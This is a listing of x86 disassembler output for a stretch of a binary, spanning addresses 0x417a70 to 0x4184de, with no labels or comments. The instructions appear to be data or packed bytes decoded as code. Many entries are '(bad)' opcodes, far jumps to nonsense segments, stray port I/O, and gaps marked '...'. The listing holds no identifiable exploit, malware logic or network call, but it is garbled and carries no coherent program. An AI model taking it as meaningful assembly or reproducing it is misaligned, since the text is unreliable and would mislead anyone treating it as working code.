  417a70:	adc    ch,BYTE PTR [ecx]
  417a72:	or     DWORD PTR [ecx+0x121ded33],ecx
	...
  417a98:	pop    DWORD PTR [ebx+0xf24000f]
  417a9e:	sti    
  417a9f:	xor    eax,0x3fdf58
  417aa4:	mov    ebx,0xf502bba2
  417aa9:	std    
  417aaa:	(bad)  
  417aab:	jmp    0xfde4:0xca37e5ea
  417ab2:	dec    esi
  417ab3:	inc    ecx
  417ab5:	test   eax,0xacf443e4
  417aba:	(bad)  
  417abb:	cmp    esi,DWORD PTR [ebx-0x73aa11d0]
  417ac1:	fidivr WORD PTR [ecx-0x1]
  417ac4:	cmp    ebp,edi
  417ac6:	mov    edi,0x570aca5f
  417acb:	mov    edx,DWORD PTR [ecx+0x9]
  417ace:	ret    0xa404
  417ad1:	and    cl,BYTE PTR [ecx+0x7d88106c]
  417ad7:	in     al,dx
  417ad8:	cmp    al,0x0
  417ada:	add    BYTE PTR [eax],al
  417adc:	ja     0x417ace
  417ade:	(bad)  
  417adf:	push   ebx
  417ae0:	fneni(8087 only) 
  417ae2:	adc    dh,BYTE PTR gs:[ebp+edi*8+0x5d81ff4f]
  417aea:	adc    al,BYTE PTR [eax+0x64]
  417aed:	addr16 std 
  417aef:	addr16 gs inc ecx
  417af2:	sbb    DWORD PTR ss:[ebx+ecx*1],ecx
  417af6:	retf   0x7401
  417af9:	xchg   BYTE PTR [ecx+0x6c],al
	...
  417b18:	add    BYTE PTR [eax],al
  417b1a:	dec    edi
  417b1b:	shl    BYTE PTR [ecx+0x8],0x97
  417b1f:	mov    ebp,0xfd41e940
  417b24:	(bad)  
  417b25:	inc    DWORD PTR [edx]
  417b27:	jns    0x684e2b72
  417b2d:	and    ecx,DWORD PTR ds:0x35fd1fdf
  417b33:	in     eax,0xc7
  417b35:	jmp    DWORD PTR [edx]
  417b37:	dec    esp
  417b38:	mov    cs,WORD PTR [esi-0x172b6dea]
  417b3e:	shl    BYTE PTR [edi+0x35100001],0x2
  417b45:	add    BYTE PTR ds:0x5e4fefed,cl
  417b4b:	fs dec esi
  417b4d:	inc    esp
  417b4e:	mov    ds,WORD PTR [esi+0x1a14e8d4]
  417b54:	add    DWORD PTR [eax],eax
  417b56:	mov    BYTE PTR [esi-0x6779e4ad],ah
  417b5c:	xor    DWORD PTR [eax-0x73],ebp
  417b5f:	push   0x5b980040
  417b64:	push   ebp
  417b65:	sti    
  417b66:	ret    0x3159
  417b69:	call   0x430044
  417b6e:	mov    BYTE PTR [esi],ah
  417b70:	add    al,0x93
  417b72:	int    0xec
  417b74:	mov    esi,0xc1d61473
  417b79:	data16 test BYTE PTR [ebx+0x55],bl
  417b7d:	sti    
	...
  417b9a:	add    BYTE PTR [eax],al
  417b9c:	xchg   edx,eax
  417b9d:	or     DWORD PTR [edx+0x1e70cee],ebx
  417ba3:	mov    ecx,DWORD PTR [eax+0x7afdd848]
  417ba9:	dec    esi
  417baa:	stc    
  417bab:	aas    
  417bac:	les    esi,FWORD PTR [ebx-0x29]
  417baf:	mov    edx,DWORD PTR [eax+0x62fdd682]
  417bb5:	jbe    0x417b8b
  417bb7:	adc    edx,DWORD PTR [ebp-0x7fffbe4b]
  417bbd:	arpl   WORD PTR [ebp-0x5],dx
  417bc0:	dec    edx
  417bc1:	loope  0x417bf5
  417bc3:	std    
  417bc4:	sbb    BYTE PTR [eax],al
  417bc6:	(bad)  
  417bc7:	idiv   dl
  417bc9:	jmp    FWORD PTR [edi+0x49]
  417bcc:	mov    ebp,0x2abeeae7
  417bd1:	shl    BYTE PTR [ebx-0x3c],1
  417bd4:	cdq    
  417bd5:	xor    eax,0xe79e811e
  417bda:	jg     0x417b78
  417bdc:	or     eax,0x18dbe700
  417be1:	out    0xe7,eax
  417be3:	add    edx,DWORD PTR [ebp+edx*1+0x3af703]
  417bea:	bound  edi,QWORD PTR [ebp+ecx*1-0x17c91900]
  417bf1:	adc    eax,0x4ce88b
  417bf6:	xchg   BYTE PTR [edx+0xec14b86],bh
  417bfc:	enter  0xb755,0x7e
	...
  417c1c:	add    BYTE PTR [eax],al
  417c1e:	dec    esi
  417c1f:	push   eax
  417c20:	pop    esp
  417c21:	dec    eax
  417c22:	or     eax,0x3d497002
  417c27:	iret   
  417c28:	aam    0x53
  417c2a:	xchg   BYTE PTR [ebp-0x30572f2d],al
  417c30:	mov    bh,0x5d
  417c32:	mov    ds:0x3d87ac7c,al
  417c37:	jge    0x417bdd
  417c39:	fstp   TBYTE PTR ds:0xd7697d8
  417c3f:	add    BYTE PTR [edx+0xbcc3ed2],bl
  417c45:	inc    edi
  417c46:	or     eax,0x480f35cf
  417c4b:	push   esp
  417c4c:	xor    DWORD PTR [ebx],esi
  417c4e:	push   0xb6db7b55
  417c53:	dec    esp
  417c54:	push   es
  417c55:	rcr    DWORD PTR [eax+eax*8],cl
  417c58:	popf   
  417c59:	cs mov ebp,es
  417c5c:	add    BYTE PTR [ebp-0x77],bh
  417c5f:	ret    0xe904
  417c62:	add    eax,0x238ec79
  417c67:	ss push ebp
  417c69:	jb     0x417c88
  417c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c6c:	fld    TBYTE PTR [edx]
  417c6e:	adc    DWORD PTR [ecx],edx
  417c70:	fnstcw WORD PTR [edx]
  417c72:	ficom  DWORD PTR [edi-0x17]
  417c75:	out    0xd1,eax
  417c77:	call   DWORD PTR [eax+0x72]
  417c7a:	aaa    
  417c7b:	fsub   st,st(2)
  417c7d:	add    DWORD PTR [ecx],edx
  417c7f:	add    BYTE PTR [ecx+0x1a],dl
	...
  417c9e:	add    BYTE PTR [eax],al
  417ca0:	popa   
  417ca1:	das    
  417ca2:	sbb    eax,0x88311128
  417ca7:	and    al,0xde
  417ca9:	xlat   BYTE PTR ds:[ebx]
  417caa:	rol    cl,cl
  417cac:	push   cs
  417cad:	add    BYTE PTR [eax],bh
  417caf:	sub    al,0xbe
  417cb1:	push   edx
  417cb2:	or     bl,al
  417cb4:	rcl    DWORD PTR [edx+0x4],cl
  417cb7:	mov    edx,0xba01d8ce
  417cbc:	into   
  417cbd:	aas    
  417cbe:	pop    ebp
  417cbf:	pslld  mm0,mm6
  417cc2:	sar    DWORD PTR [ebx+edi*1+0x7e4d7fdc],0xff
  417cca:	(bad)  
  417ccb:	call   0xc396b2b3
  417cd0:	push   cs
  417cd1:	jnp    0x417c56
  417cd3:	stc    
  417cd4:	mov    edi,0x3699fdcc
  417cd9:	and    DWORD PTR [eax],ecx
  417cdb:	or     ebx,DWORD PTR [esi-0x29]
  417cde:	mov    cl,0x21
  417ce0:	or     DWORD PTR [eax],eax
  417ce2:	mov    ebx,DWORD PTR [esi+eiz*8+0xee9a887]
  417ce9:	add    al,ch
  417ceb:	test   al,0x74
  417ced:	(bad)  
  417cee:	(bad)  
  417cef:	fidiv  DWORD PTR [ebx+0x64ffff8c]
  417cf5:	add    al,BYTE PTR [eax-0x50d1673]
  417cfb:	inc    DWORD PTR [ebx+0x11]
  417cfe:	mov    DWORD PTR [ebp-0x24],eax
  417d01:	adc    dl,BYTE PTR [ebx-0x1]
	...
  417d20:	add    BYTE PTR [eax],al
  417d22:	cmp    DWORD PTR [esi-0x7adbbff1],esp
  417d28:	shl    BYTE PTR [ebp-0x9],0x2b
  417d2c:	hlt    
  417d2d:	add    DWORD PTR [edx+eax*1],esi
  417d30:	sti    
  417d31:	adc    eax,0x3dd5c8
  417d36:	mov    eax,ds:0x4e50fc46
  417d3b:	add    DWORD PTR [edx+0x0],ebp
  417d3e:	popa   
  417d3f:	inc    ebp
  417d40:	cwde   
  417d41:	push   eax
  417d42:	cmp    ecx,DWORD PTR [ecx+0x79]
  417d45:	cld    
  417d46:	xchg   ebx,eax
  417d47:	aad    0x39
  417d49:	adc    BYTE PTR [esp+eax*1],dh
  417d4c:	add    eax,0x858ad0f9
  417d52:	xchg   esp,eax
  417d53:	mov    al,0xfb
  417d55:	push   esp
  417d57:	dec    esp
  417d58:	jno    0x417d56
  417d5a:	mov    WORD PTR [esi],cs
  417d5c:	pop    DWORD PTR [eax]
  417d5e:	mov    ah,0xac
  417d60:	add    dh,BYTE PTR [edx]
  417d62:	in     al,0x77
  417d64:	shl    BYTE PTR [edx+eiz*4-0x51],0xbf
  417d69:	cmp    BYTE PTR [edi],0x5
  417d6c:	jb     0x417d15
  417d6e:	push   es
  417d6f:	les    ebx,FWORD PTR [ebx+0x5e]
  417d72:	outs   dx,DWORD PTR ds:[esi]
  417d73:	mov    bh,BYTE PTR [edi-0xc535a50]
  417d79:	mov    esi,DWORD PTR [esp+eax*4-0x8]
  417d7d:	(bad)  
  417d7e:	mov    eax,0x98c082cc
  417d83:	clc    
  417d84:	dec    edi
  417d85:	inc    DWORD PTR [eax]
	...
  417da3:	add    BYTE PTR [ecx+0x5],bh
  417da6:	cmovo  ecx,DWORD PTR ds:0x9653c4d7
  417dad:	retf   
  417dae:	test   ah,ah
  417db0:	push   ebp
  417db1:	pop    edx
  417db2:	loopne 0x417dc0
  417db4:	mov    esi,0x65890170
  417db9:	bound  eax,QWORD PTR [ebp+0x18]
  417dbc:	call   0x3abf4e9e
  417dc1:	pop    es
  417dc2:	iret   
  417dc3:	jae    0x417dde
  417dc5:	xor    DWORD PTR [edi*8+0x73d0c6a0],eax
  417dcc:	adc    DWORD PTR [esi-0x53e5f7aa],edi
  417dd2:	inc    ecx
  417dd3:	adc    cl,ch
  417dd5:	(bad)  
  417dd6:	test   al,bh
  417dd8:	or     cl,BYTE PTR [eax+ecx*1]
  417ddb:	xor    cl,ch
  417ddd:	shl    DWORD PTR [esi],0xf5
  417de0:	push   eax
  417de1:	inc    DWORD PTR [ebx]
  417de3:	add    BYTE PTR [ebp+0x61017ad6],cl
  417de9:	iret   
  417dea:	test   BYTE PTR [ecx+ebp*1-0x21],cl
  417dee:	rol    BYTE PTR [ecx-0x30244b7],1
  417df4:	and    BYTE PTR [edx],0x28
  417df7:	or     BYTE PTR [ebp-0x19],bl
  417dfa:	xor    ebp,DWORD PTR [edx+0xd]
  417dfd:	jg     0x417dda
  417dff:	add    cl,BYTE PTR ds:0x57ff91d7
  417e05:	push   edx
  417e06:	out    0x5b,al
	...
  417e24:	add    BYTE PTR [eax],al
  417e26:	iret   
  417e27:	retf   0x5301
  417e2a:	xchg   esi,eax
  417e2b:	or     dh,BYTE PTR [edx]
  417e2d:	dec    edi
  417e2e:	mov    BYTE PTR [ebx-0x5c79af37],bl
  417e34:	stc    
  417e35:	cld    
  417e36:	cmp    eax,0x1f37f616
  417e3b:	xchg   edi,eax
  417e3c:	add    DWORD PTR [ebx+0x79bff4d],eax
  417e42:	aas    
  417e43:	rcl    BYTE PTR [edx],0xfe
  417e46:	xchg   ebp,eax
  417e47:	inc    edx
  417e48:	(bad)  
  417e4a:	or     edi,DWORD PTR [ecx-0x5c]
  417e4d:	iret   
  417e4e:	xchg   edx,eax
  417e4f:	inc    ebp
  417e50:	jmp    0x417de5
  417e52:	push   edx
  417e53:	mov    bh,0x29
  417e55:	pop    es
  417e56:	or     eax,0x8cdf6233
  417e5b:	fcmovnbe st,st(7)
  417e5d:	test   BYTE PTR [esi-0x3c9182d],ch
  417e63:	mov    edi,0x4a960551
  417e68:	iret   
  417e69:	fwait
  417e6a:	xchg   esi,eax
  417e6b:	inc    edx
  417e6c:	shl    DWORD PTR [eax+ebx*1],cl
  417e6f:	push   edx
  417e70:	mov    edi,0xbdf7ce7b
  417e75:	pop    ecx
  417e76:	add    esp,ecx
  417e78:	test   esi,0x43d9281e
  417e7e:	or     eax,0x959a785
  417e83:	push   cs
  417e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e85:	fist   DWORD PTR [esi]
  417e87:	ja     0x417eb5
  417e89:	fadd   DWORD PTR [eax]
	...
  417ea7:	add    BYTE PTR [edx-0x2ab69dfe],cl
  417ead:	jns    0x417edc
  417eaf:	or     BYTE PTR [ebp-0x3042e1ff],bl
  417eb5:	add    al,0xe7
  417eb7:	into   
  417eb8:	cmp    DWORD PTR [ebx+ebx*8],esp
  417ebb:	pop    ecx
  417ebc:	or     eax,0x1d27dbcb
  417ec1:	retf   
  417ec2:	shl    DWORD PTR [edi],cl
  417ec4:	std    
  417ec5:	retf   0xcf17
  417ec8:	(bad)  
  417ec9:	daa    
  417eca:	stc    
  417ecb:	inc    ebx
  417ecc:	or     eax,0x52eb1fd3
  417ed1:	rcr    DWORD PTR [edi],cl
  417ed3:	ret    0x19
  417ed6:	add    BYTE PTR [edi+eax*1-0x72169524],bl
  417edd:	aas    
  417ede:	adc    BYTE PTR [ecx+0x72104f43],bh
  417ee4:	aam    0xf7
  417ee6:	cld    
  417ee7:	pushf  
  417ee8:	(bad)  
  417ee9:	int3   
  417eea:	xor    BYTE PTR [esi],cl
  417eec:	push   esp
  417eed:	aas    
  417eee:	adc    ch,BYTE PTR [ecx+0x74c07f0e]
  417ef4:	adc    eax,0x67f6c881
  417ef9:	add    DWORD PTR [ecx-0x3dd9c15c],ecx
  417eff:	cmc    
  417f00:	push   cs
  417f01:	xor    DWORD PTR [ecx],esi
  417f03:	ret    0xe716
  417f06:	(bad)  
  417f07:	mov    ah,0xcf
  417f09:	push   DWORD PTR [edx+0x17]
	...
  417f28:	add    BYTE PTR [eax],al
  417f2a:	jecxz  0x417eb5
  417f2c:	or     BYTE PTR [edi-0x41aa0031],ah
  417f32:	add    eax,0x92911f3
  417f37:	or     BYTE PTR [ebx],bl
  417f39:	mov    eax,ds:0x1c0040bd
  417f3e:	loopne 0x417ec1
  417f40:	sbb    edi,DWORD PTR [ecx+0x600040a7]
  417f46:	fnsave [esi-0x7ceed537]
  417f4c:	sbb    esi,DWORD PTR [ebp-0x58ffbf63]
  417f52:	adc    eax,0x92adbb8
  417f57:	retf   
  417f58:	push   ebx
  417f59:	outs   dx,BYTE PTR ds:[esi]
  417f5a:	mov    ch,0xe6
  417f5c:	adc    DWORD PTR [ecx+0x2d9f2a0e],ebp
  417f62:	addr16 inc eax
  417f64:	add    BYTE PTR [edx],dl
  417f66:	into   
  417f67:	dec    esi
  417f68:	sub    cl,al
  417f6a:	dec    si
  417f6c:	inc    eax
  417f6d:	add    BYTE PTR [ecx+edi*4+0x3e665411],ah
  417f74:	add    BYTE PTR [ebx],bh
  417f76:	aaa    
  417f77:	xor    edx,DWORD PTR [ecx]
  417f79:	push   0x402840
  417f7e:	mov    ah,0xb9
  417f80:	adc    DWORD PTR [eax-0x5cffc19a],ebp
  417f86:	sub    BYTE PTR [esi-0x42c0ffc1],al
  417f8c:	jno    0x417f92
	...
  417faa:	add    BYTE PTR [eax],al
  417fac:	xchg   esi,eax
  417fad:	mov    esi,0xabf15e7
  417fb2:	and    al,0x8
  417fb4:	mov    fs,esi
  417fb6:	cli    
  417fb7:	je     0x418009
  417fb9:	into   
  417fba:	push   eax
  417fbb:	call   DWORD PTR ds:0x4cf7d0bd
  417fc1:	fdivr  DWORD PTR [ebp-0x3de7a309]
  417fc7:	or     BYTE PTR [edi+ecx*1],ah
  417fca:	das    
  417fcb:	fisttp DWORD PTR [ebx+ebx*8]
  417fce:	(bad)
  417fd1:	add    al,0x71
  417fd3:	and    bh,BYTE PTR ss:[edx+0x8]
  417fd7:	fisub  WORD PTR [edi]
  417fd9:	add    al,0x56
  417fdb:	push   ecx
  417fdd:	aad    0xf
  417fdf:	inc    eax
  417fe0:	hlt    
  417fe1:	cmc    
  417fe2:	sbb    al,cl
  417fe4:	cdq    
  417fe5:	aas    
  417fe6:	add    BYTE PTR [ebp-0x23],dh
  417fe9:	inc    esi
  417fea:	sbb    eax,edx
  417fec:	lahf   
  417fed:	aas    
  417fee:	add    BYTE PTR [ecx+0x43c789e9],cl
  417ff4:	mov    ah,0x46
  417ff6:	sbb    esp,ecx
  417ff8:	mov    DWORD PTR [edi],edi
  417ffa:	add    dh,al
  417ffc:	mov    eax,ds:0xb443d985
  418001:	(bad)  
  418002:	push   ebp
  418003:	dec    DWORD PTR ds:0x4d11edcc
  418009:	xlat   BYTE PTR ds:[ebx]
  41800a:	sub    ebx,DWORD PTR [edi+0x3f0ebd]
	...
  41802c:	add    BYTE PTR [eax],al
  41802e:	inc    esi
  41802f:	push   ss
  418030:	push   ebp
  418031:	sub    ch,dh
  418033:	out    dx,al
  418034:	push   esp
  418035:	inc    eax
  418036:	or     eax,0x1f53f51a
  41803b:	xchg   edi,eax
  41803c:	add    DWORD PTR [ecx],edi
  41803e:	dec    esi
  41803f:	jae    0x418037
  418041:	addr16 stc 
  418043:	push   0xf9bd0041
  418048:	hlt    
  418049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41804a:	call   DWORD PTR [esi+0xe5da101]
  418050:	aas    
  418051:	add    BYTE PTR [esi],al
  418053:	push   ss
  418054:	push   ebp
  418055:	add    al,0xff
  418057:	push   ss
  418058:	xlat   BYTE PTR ds:[ebx]
  418059:	adc    eax,DWORD PTR [esi-0x48f7d7ed]
  41805f:	out    dx,al
  418060:	retf   0xe974
  418063:	(bad)  
  418064:	xor    ch,bh
  418066:	fdivr  QWORD PTR [ecx-0x21ca0a4f]
  41806c:	shl    ebp,0xe5
  41806f:	sbb    eax,0xec0d08c2
  418074:	jbe    0x418062
  418076:	mov    cs,WORD PTR [edx+0x4e5a561d]
  41807c:	dec    esi
  41807d:	adc    BYTE PTR [esi+0x59fd8666],dl
  418083:	cld    
  418084:	fistp  DWORD PTR [edi+0x76]
  418087:	xlat   BYTE PTR ds:[ebx]
  418088:	add    DWORD PTR [ecx+ecx*1],edi
  41808b:	lds    ebp,FWORD PTR ds:0x3173508b
  418091:	push   esi
	...
  4180ae:	add    BYTE PTR [eax],al
  4180b0:	mov    ch,0x98
  4180b2:	retf   
  4180b3:	std    
  4180b4:	mov    edx,0x973c162
  4180b9:	add    BYTE PTR [ecx],bl
  4180bb:	les    esi,FWORD PTR [esp+eax*2+0x154e6a]
  4180c2:	bound  edx,QWORD PTR [esi]
  4180c4:	dec    ecx
  4180c5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c7:	add    esp,DWORD PTR [edi]
  4180c9:	clc    
  4180ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cb:	push   edi
  4180cc:	push   ss
  4180cd:	xor    DWORD PTR [esi+eax*2+0x59],ebp
  4180d1:	das    
  4180d2:	ss push esi
  4180d4:	add    eax,0x498015c9
  4180d9:	sti    
  4180da:	imul   ecx,DWORD PTR [esi+0x19],0xb9fe9300
  4180e1:	jp     0x41808f
  4180e3:	scas   eax,DWORD PTR es:[edi]
  4180e4:	mov    ebp,0x51ff94c8
  4180e9:	mov    cl,0x6a
  4180eb:	(bad)  
  4180ec:	sbb    DWORD PTR [ebx+0x31145722],eax
  4180f2:	fs inc esi
  4180f4:	xor    DWORD PTR [edi],ebp
  4180f6:	call   0xc1f8:0xab7c5bcc
  4180fd:	jp     0x418123
  4180ff:	fdivr  DWORD PTR [ebp+0x19f45cc8]
  418105:	mov    cl,0xc2
  418107:	sbb    BYTE PTR [esi+0x18c372a4],cl
  41810d:	cmp    eax,0x4e0034aa
  418112:	jecxz  0x4180de
	...
  418130:	add    BYTE PTR [eax],al
  418132:	jle    0x41812c
  418134:	lods   eax,DWORD PTR ds:[esi]
  418135:	adc    dh,al
  418137:	in     eax,dx
  418138:	(bad)  
  418139:	cmc    
  41813a:	sub    al,BYTE PTR [eax]
  41813c:	les    ebx,FWORD PTR fs:[ecx+0x68]
  418140:	ins    BYTE PTR es:[edi],dx
  418141:	retf   
  418142:	popa   
  418143:	icebp  
  418144:	arpl   WORD PTR [edi-0x3ef0aa7],bp
  41814a:	pop    ebp
  41814b:	das    
  41814c:	jle    0x41813f
  41814e:	push   esi
  41814f:	out    dx,al
  418150:	jmp    FWORD PTR [eax]
  418152:	adc    DWORD PTR [ecx-0x3861223c],eax
  418158:	pop    esi
  418159:	(bad)  
  41815a:	imul   eax,edx,0x78dde90c
  418160:	in     al,dx
  418161:	mov    eax,0xe173c4e3
  418166:	(bad)  
  418167:	repz inc edi
  418169:	fcmovne st,st(6)
  41816b:	inc    DWORD PTR [eax+0x4c4c5641]
  418171:	push   0x34
  418173:	(bad)  
  418174:	std    
  418175:	push   0x69
  418177:	lock mov esi,0x6a375c09
  41817d:	jmp    0xe:0xe967fcc0
  418184:	or     BYTE PTR [esi],0xbc
  418187:	test   DWORD PTR [edx-0xe27ad54],0x84c557fd
  418191:	sub    ebp,ebx
  418193:	out    0x69,al
  418195:	jmp    0x41819a
	...
  4181b2:	add    BYTE PTR [eax],al
  4181b4:	sar    bh,1
  4181b6:	cld    
  4181b7:	pop    esp
  4181b8:	and    eax,0xcd6cd910
  4181bd:	ret    
  4181be:	call   0xfe06c9a8
  4181c3:	gs dec esi
  4181c5:	dec    esp
  4181c6:	or     al,0x74
  4181c8:	dec    ebp
  4181c9:	(bad)  
  4181ca:	call   0xfe064c4d
  4181cf:	jns    0x4181e2
  4181d1:	(bad)  [edx]
  4181d3:	pop    esp
  4181d4:	dec    ebp
  4181d5:	(bad)  
  4181d6:	call   0xfe065435
  4181db:	fcmovne st,st(6)
  4181dd:	sub    bh,al
  4181df:	stos   DWORD PTR es:[edi],eax
  4181e0:	(bad)  
  4181e1:	(bad)  
  4181e2:	push   esp
  4181e3:	bound  edi,QWORD PTR [edx-0x73ff1b80]
  4181e9:	jge    0x4181d7
  4181eb:	sub    al,0x37
  4181ed:	cmp    BYTE PTR [eax+eax*1],dl
  4181f0:	sbb    dh,BYTE PTR [eax]
  4181f2:	jne    0x4181dc
  4181f4:	adc    edx,DWORD PTR [esi-0x3]
  4181f7:	push   eax
  4181f9:	push   DWORD PTR [ecx+0x70]
  4181fc:	xor    DWORD PTR [edi],eax
  4181fe:	and    al,0x8
  418200:	push   esp
  418201:	or     eax,0xba41b3e8
  418206:	sti    
  418207:	test   BYTE PTR [edi+esi*1],dh
  41820a:	js     0x41818f
  41820c:	ror    edx,0xfd
  41820f:	mov    bh,BYTE PTR [ecx+0xe]
  418212:	push   ss
  418213:	inc    eax
  418214:	fs or  ebp,DWORD PTR ss:[edx+0x0]
	...
  418235:	add    BYTE PTR [ecx+edi*4+0x71],bl
  418239:	or     cl,dh
  41823b:	push   es
  41823c:	and    al,0x10
  41823e:	xchg   esp,eax
  41823f:	mov    ecx,0xcf2883d6
  418244:	cmp    BYTE PTR [ebp+0x40],0x2
  418248:	je     0x418259
  41824a:	sahf   
  41824b:	retf   0x75fc
  41824e:	xor    BYTE PTR [edi+0x44],al
  418251:	and    al,0x5c
  418253:	adc    bh,bl
  418255:	(bad)  
  418256:	mov    bh,0xbf
  418258:	or     al,0x83
  41825a:	ror    ebx,0xfd
  41825d:	jae    0x418292
  41825f:	and    al,0x8
  418261:	(bad)  
  418262:	mov    ecx,0x18448acb
  418267:	sbb    al,0x50
  418269:	call   FWORD PTR [edx+0x4e0cc47b]
  41826f:	(bad)  
  418270:	cld    
  418271:	jne    0x41824b
  418273:	dec    esi
  418274:	inc    esp
  418275:	and    al,0xbc
  418277:	adc    ebx,edi
  418279:	(bad)  
  41827a:	ja     0x41823c
  41827c:	or     al,0x8d
  41827e:	or     eax,0x3d082013
  418283:	or     bl,ah
  418285:	fxch   st(0)
  418287:	jle    0x418250
  418289:	jmp    0x108ec8a8
  41828e:	mov    edx,0x38fcf5c4
  418293:	(bad)  
  418295:	xor    DWORD PTR [edx+0x1231c4],ebp
	...
  4182b7:	add    BYTE PTR [ebp-0x29],cl
  4182ba:	rcr    al,1
  4182bc:	not    BYTE PTR [esi]
  4182be:	iret   
  4182bf:	fdiv   DWORD PTR [ebx]
  4182c1:	(bad)  
  4182c2:	fstp   QWORD PTR [ebx+0x4f]
  4182c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182c6:	add    DWORD PTR [eax-0x73],ebp
  4182c9:	xlat   BYTE PTR ds:[ebx]
  4182ca:	add    DWORD PTR [eax],eax
  4182cc:	jp     0x418251
  4182ce:	sbb    eax,0x1dac7208
  4182d3:	adc    cl,ch
  4182d5:	(bad)  
  4182d6:	enter  0x2974,0xdb
  4182da:	enter  0x2913,0xc9
  4182de:	inc    ecx
  4182df:	add    BYTE PTR [edx+0xf],bl
  4182e2:	jmp    0x4182a3
  4182e4:	inc    edx
  4182e5:	pop    ds
  4182e6:	mov    BYTE PTR [ecx*1-0x71138394],0xfb
  4182ee:	out    dx,eax
  4182ef:	add    al,0xd2
  4182f2:	enter  0xc351,0x2e
  4182f6:	test   BYTE PTR [eax],al
  4182f8:	or     eax,0xa7015bd7
  4182fd:	fstp   DWORD PTR [ecx+0x0]
  418300:	or     eax,0x80fd81d7
  418305:	iret   
  418306:	jbe    0x41834b
  418308:	add    DWORD PTR [edi-0x7205064e],ebp
  41830e:	jge    0x4182d0
  418310:	jns    0x418349
  418312:	jne    0x418357
  418314:	jmp    0x5eb8ba18
  418319:	ror    BYTE PTR [edi+0x22],1
	...
  418337:	add    BYTE PTR [eax],al
  418339:	add    cl,bl
  41833b:	les    edx,FWORD PTR [esi+0x374bcd7f]
  418341:	adc    eax,0xd02406e4
  418346:	cmp    BYTE PTR [edi],dh
  418348:	jb     0x418398
  41834a:	mov    ebp,0xb382e451
  41834f:	jmp    esi
  418351:	mov    ds:0xb234d0d,eax
  418356:	inc    esi
  418357:	int3   
  418358:	(bad)  
  418359:	call   ebp
  41835b:	rcr    ch,1
  41835d:	inc    esp
  41835e:	cmp    ebx,eax
  418360:	ds sub eax,0x70c48a
  418366:	inc    esp
  418367:	shl    DWORD PTR [ebx-0x5b8d23e0],0xfb
  41836e:	ret    
  41836f:	sub    eax,0xc3dec897
  418374:	es out dx,al
  418376:	into   
  418377:	icebp  
  418378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418379:	add    ecx,DWORD PTR [esi-0x7a086441]
  41837f:	cmp    bl,bh
  418381:	or     al,0x53
  418383:	dec    edx
  418384:	in     al,dx
  418385:	jp     0x41834f
  418387:	sti    
  418388:	adc    edi,esp
  41838a:	cmp    DWORD PTR [edi+edi*8],ecx
  41838d:	in     al,0xd7
  41838f:	(bad)  
  418390:	out    0x76,al
  418392:	into   
  418393:	ret    
  418394:	iret   
  418395:	xor    ah,BYTE PTR [esp+eax*8]
  418398:	ficom  WORD PTR [edx]
  41839a:	dec    ebp
  41839b:	and    eax,0xbd32
	...
  4183bc:	dec    edi
  4183bd:	sti    
  4183be:	out    0x7c,al
  4183c0:	sub    BYTE PTR [ecx+0x26],bh
  4183c3:	add    BYTE PTR [esi+0x36dcbb3d],dl
  4183c9:	mov    DWORD PTR [eax],0xff90cab6
  4183cf:	ror    eax,0x2f
  4183d2:	mov    DWORD PTR [ebp-0xea486e2],edx
  4183d8:	(bad)  
  4183da:	adc    BYTE PTR [edx-0x6e],ah
  4183dd:	jns    0x4183b0
  4183df:	and    DWORD PTR [ebx],0x42e90000
  4183e5:	shl    BYTE PTR [ebx-0x1b],0x1f
  4183e9:	shr    cl,0xc8
  4183ec:	loopne 0x4183b2
  4183ee:	jae    0x4183c9
  4183f0:	daa    
  4183f1:	or     eax,0xc4a6dc01
  4183f6:	jae    0x4183e5
  4183f8:	call   0xa0e697c1
  4183fd:	add    eax,DWORD PTR [eax]
  4183ff:	push   0x4d
  418401:	hlt    
  418402:	cmp    BYTE PTR [esi+0x70014d82],ah
  418408:	xor    bh,ah
  41840a:	mov    BYTE PTR [edi],ch
  41840c:	sub    ebp,DWORD PTR [ecx]
  41840e:	pop    ebx
  41840f:	sub    esp,DWORD PTR [ebp-0x3d]
  418412:	push   ebx
  418413:	jb     0x41844e
  418415:	sub    eax,0x4d56b739
  41841a:	and    DWORD PTR [edx+0x1b],esp
  41841d:	hlt    
  41841e:	mov    ch,BYTE PTR [eax+0x0]
	...
  41843c:	add    BYTE PTR [eax],al
  41843e:	push   ebx
  41843f:	jg     0x418403
  418441:	jge    0x418487
  418443:	int3   
  418444:	ror    dl,1
  418446:	dec    esp
  418447:	add    DWORD PTR [edi+0x2d94162],edi
  41844d:	bound  edx,QWORD PTR [edi+0x2d]
  418450:	call   0xfe04761c
  418455:	gs dec esi
  418457:	dec    esp
  418458:	add    esp,DWORD PTR [eax-0x38]
  41845b:	imul   DWORD PTR [edi-0x3eddcc18]
  418461:	add    BYTE PTR [edx],ah
  418463:	adc    eax,DWORD PTR [edi+0x71ba71f8]
  418469:	or     BYTE PTR [ecx-0x6a],ah
  41846c:	je     0x4184a8
  41846e:	adc    eax,0x7136e6ff
  418473:	xchg   esi,eax
  418474:	je     0x4184ac
  418476:	imul   eax,DWORD PTR [edx],0x32a48502
  41847c:	sub    ebp,eax
  41847e:	cwde   
  41847f:	adc    edi,ebp
  418481:	(bad)  
  418482:	aas    
  418483:	scas   eax,DWORD PTR es:[edi]
  418484:	xor    esi,0x3067e2c0
  41848a:	mov    cl,0xfe
  41848c:	call   DWORD PTR [esi+0x2f]
  41848f:	cmp    esp,DWORD PTR [esp+edx*1]
  418492:	bound  esp,QWORD PTR [esi-0x45c41441]
  418498:	test   al,al
  41849a:	mov    cl,0xc8
  41849c:	push   ebx
  41849d:	call   0x3e9d0d
	...
  4184be:	add    BYTE PTR [eax],al
  4184c0:	xchg   BYTE PTR [esi-0x1202df19],bh
  4184c6:	scas   eax,DWORD PTR es:[edi]
  4184c7:	add    edi,ecx
  4184c9:	fsub   DWORD PTR [ebp+0x30]
  4184cc:	mov    eax,ds:0x2b56fffe
  4184d1:	xor    esp,DWORD PTR [esp+edx*1]
  4184d4:	cld    
  4184d5:	in     al,dx
  4184d6:	jmp    0x4184d7
  4184d8:	sti    
  4184d9:	jg     0x4184b2
  4184db:	mov    ch,ah
  4184dd:	leave  
  4184de:	xchg   edx,eax
